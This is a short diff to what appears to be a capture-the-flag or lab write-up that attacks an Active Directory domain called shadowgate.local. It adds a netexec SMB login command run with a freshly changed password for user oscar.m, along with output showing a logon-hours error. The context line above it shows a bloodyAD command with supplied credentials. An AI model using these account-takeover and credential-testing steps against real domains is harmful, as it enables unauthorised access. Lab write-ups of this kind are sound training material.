@@ -595,5 +595,11 @@ bloodyAD --host sg-dc01.shadowgate.local -d shadowgate.local -u bogdan.r -p 'bog
 First ill change his password
 
 ```python
-
+nxc smb sg-dc01.shadowgate.local -u oscar.m -p 'Password123!'  
+SMB         10.1.232.232    445    SG-DC01          [*] Windows 10 / Server 2019 Build 17763 x64 (name:SG-DC01) (domain:shadowgate.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.1.232.232    445    SG-DC01          [-] shadowgate.local\oscar.m:Password123! STATUS_INVALID_LOGON_HOURS
 ```
+
+Interesting error
+
+
